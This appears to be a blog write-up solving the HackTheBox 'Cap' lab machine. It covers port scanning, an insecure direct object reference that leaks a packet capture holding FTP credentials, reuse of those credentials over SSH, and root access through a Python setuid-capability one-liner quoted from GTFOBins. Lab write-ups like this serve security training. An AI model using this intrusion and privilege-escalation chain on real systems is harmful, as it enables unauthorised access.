---
title: "Writeup - Cap HTB"
date: 2025-02-19T00:00:00+00:00
tags: ["hacking", "english","cybersec","writeups"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "A brief solution of the Cap machine on HackTheBox"
---

Ping for TTL and visibility

``` java
❯ ping -c 1 10.10.10.245

PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data.
64 bytes from 10.10.10.245: icmp_seq=1 ttl=63 time=37.3 ms

--- 10.10.10.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 37.252/37.252/37.252/0.000 ms
```

(TTL suggests Linux)

``` java
❯ sudo nmap -sS -A -T4 10.10.10.245 -oN nmap.txt

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 19:30 CET
Nmap scan report for 10.10.10.245
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   37.88 ms 10.10.14.1
2   38.07 ms 10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.76 seconds
```

## FTP Enum

No FTP anon login allowed sadly:

``` bash
❯ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> 
ftp> exit
221 Goodbye.

❯ sudo nmap -p 21 --script ftp-anon 10.10.10.245
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 19:34 CET
Nmap scan report for 10.10.10.245
Host is up (0.039s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 4.59 seconds
```

Lets take a look at the other services before running into an hour long brute-force attack.
## HTTP Enum

``` bash
❯ dirb http://10.10.10.245/ | tee dirb.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 18 19:35:42 2025
URL_BASE: http://10.10.10.245/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.245/ ----
+ http://10.10.10.245/data (CODE:302|SIZE:208)                                                        
^C> Testing: http://10.10.10.245/done    
```

Dirb doesnt enumerate much of anything. I'll walk the app before running ferox.

The app has a dashboard and some network data, but the most interesting URL is hxxp://10.10.10.245/data/4, which could potentially be vulnerable to IDORs. (It's often a good practice to fuzz any endpoint that uses a cleartext number for anything)

Changing the URL to hxxp://10.10.10.245/data/0 shows different information than that which we originally had, we can download it as PCAP data.

![A packet capture depicting FTP login traffic](/images/HTB_CAP_PCAP.png)

We find FTP user cred: nathan:Buck3tH4TF0RM3!

``` java
❯ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29740|)
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 Feb 18 16:19 snap
-r--------    1 1001     1001           33 Feb 18 15:07 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||16511|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**********************************************************|    33        1.20 MiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.80 KiB/s)
```

user.txt seems to be the user flag.

We can use the same creds for SSH:

``` java
❯ ssh nathan@10.10.10.245

The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb 18 18:46:03 UTC 2025

  System load:           0.02
  Usage of /:            36.7% of 8.73GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3a27

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb 18 18:33:31 2025 from 10.10.14.238
nathan@cap:~$ 
```

Lets transfer LinPEASS via Curl to the target.

We have these two options according to it:

``` bash
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Vulnerable to CVE-2021-3560
```

I'm too lazy to try to run an exploit initially, so let's see what cap_setuid is.

This is what GTFOBins mentions on the Python page:

``` bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

In our particular case the capabilities are only under py3.8, so we could use:

``` bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

And we are root:

``` bash
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
# cat /root/root.txt
[censored]
# 
```

